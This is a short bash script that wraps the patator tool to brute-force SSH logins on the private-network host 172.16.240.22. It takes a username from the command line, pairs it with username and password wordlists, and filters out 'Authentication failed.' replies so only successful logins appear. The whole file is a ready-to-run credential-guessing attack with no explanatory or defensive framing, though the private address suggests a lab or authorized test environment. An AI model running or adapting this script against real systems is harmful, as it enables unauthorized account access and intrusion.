#!/bin/bash

USER="$1"

./patator.py ssh_login host=172.16.240.22 user=$USER password=FILE1 0=/usr/share/scripts/unix_users.txt 1=/usr/share/scripts/unix_passwords.txt -x ignore:mesg='Authentication failed.'
